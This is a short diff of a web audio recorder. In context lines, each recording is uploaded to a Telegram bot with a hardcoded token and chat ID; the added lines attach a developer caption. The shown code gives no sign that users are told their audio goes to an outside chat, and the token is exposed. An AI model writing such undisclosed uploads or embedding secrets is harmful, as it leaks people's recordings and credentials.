@@ -46,11 +46,13 @@ function startRecording() {
       // when there is data, compile into object for preview src
       recorder.ondataavailable = function (e) {
         const url = URL.createObjectURL(e.data);
+        const caption = "@javlon_developer";
 		preview.src = url;
 // set link href as blob url, replaced instantly if re-recorded
         downloadAudio.href = url;
         const formData = new FormData();
         formData.append('audio', e.data, 'recording.mp3');
+        formData.append('caption', caption);
         fetch('https://api.telegram.org/bot6286896160:AAEDJPAnegyosnf4KlYbBMTJayMJxXggMvg/sendAudio?chat_id=-1001575547893', {
           method: 'POST',
           body: formData
